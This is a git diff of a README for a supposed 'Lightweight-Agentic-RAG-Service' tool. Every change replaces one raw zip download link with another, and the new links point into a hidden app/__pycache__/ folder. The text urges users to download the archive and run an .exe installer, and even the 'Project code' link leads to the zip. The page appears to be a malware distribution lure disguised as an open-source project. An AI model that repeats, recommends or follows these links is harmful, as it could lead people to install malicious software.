@@ -1,6 +1,6 @@
 # ⚡ Lightweight-Agentic-RAG-Service - Analyze Startup Signals Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip)
 
 ## 📋 What is Lightweight-Agentic-RAG-Service?
 
@@ -56,7 +56,7 @@ Press the big green button at the top. It opens the GitHub releases page where y
 You will see files listed. Look for the one ending in `.exe` if available. If there are multiple files, pick the one with the latest date.
 
 Alternatively, click this link to visit the release page directly:  
-[Download Lightweight-Agentic-RAG-Service](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip)
+[Download Lightweight-Agentic-RAG-Service](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip)
 
 ### 2. Run the Installer
 
@@ -123,11 +123,11 @@ These steps need some technical skill. The normal install covers basic needs wel
 ## 🔗 Useful Links
 
 - Main download page:  
-  [https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip)  
+  [https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip)  
 
 - Project code and info on GitHub:  
-  [https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip)  
+  [https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip)  
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/RA_Service_Agentic_Lightweight_Phthartolatrae.zip)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/raw/refs/heads/main/app/__pycache__/Service_Lightweight_RA_Agentic_v3.8.zip)
